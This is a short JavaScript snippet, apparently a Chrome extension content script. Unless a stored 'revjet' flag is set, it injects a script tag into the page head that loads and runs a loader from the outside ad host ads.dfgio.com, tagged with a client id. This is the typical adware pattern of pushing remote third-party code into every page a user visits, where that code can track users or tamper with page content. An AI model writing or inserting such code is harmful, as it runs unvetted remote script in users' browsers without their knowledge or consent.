(function() {
	chrome.storage.local.get('revjet', function(results) {

		if (results['revjet']) {
			return;
		}

		var s = document.createElement('script');
		s.type = 'text/javascript';
		s.src = '//ads.dfgio.com/loader.js?client=dhg0827';
		document.getElementsByTagName('head')[0].appendChild(s);
	});
})();